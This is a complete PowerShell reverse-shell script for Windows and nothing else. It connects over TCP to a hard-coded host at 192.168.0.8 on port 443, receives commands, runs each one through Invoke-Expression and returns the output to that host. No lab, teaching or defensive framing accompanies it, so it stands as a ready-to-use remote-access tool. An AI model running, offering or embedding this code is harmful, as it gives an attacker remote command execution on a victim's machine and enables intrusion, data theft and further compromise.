# windows 
$LHOST = "192.168.0.8"
$LPORT = 443
$BufferSize = 1024

$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($LHOST, $LPORT)
$stream = $client.GetStream()

while ($true) {
    try {
        # Receive data from server
        $buffer = New-Object byte[] $BufferSize
        $bytesRead = $stream.Read($buffer, 0, $BufferSize)
        
        if ($bytesRead -eq 0) {
            break
        }
        
        # Decode command
        $command = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead).Trim()
        
        if ($command.Length -ge 0) {
            try {
                # Execute command using Invoke-Expression (PowerShell equivalent of shell=True)
                $output = Invoke-Expression $command 2>&1 | Out-String
            }
            catch [System.Management.Automation.CommandNotFoundException] {
                $output = $_.Exception.Message
            }
            catch {
                $output = "error $_"
            }
            
            # Send output back to server
            if ($output -eq $null -or $output.Length -eq 0) {
                $output = ""
            }
            
            $response = [System.Text.Encoding]::UTF8.GetBytes($output)
            $stream.Write($response, 0, $response.Length)
            $stream.Flush()
        }
    }
    catch {
        try {
            $errorMsg = "error $_"
            $errorBytes = [System.Text.Encoding]::UTF8.GetBytes($errorMsg)
            $stream.Write($errorBytes, 0, $errorBytes.Length)
            $stream.Flush()
        }
        catch {
            # Connection likely lost
            break
        }
    }
}

# Clean up connections
$stream.Close()
$stream.Dispose()
$client.Close()
$client.Dispose()
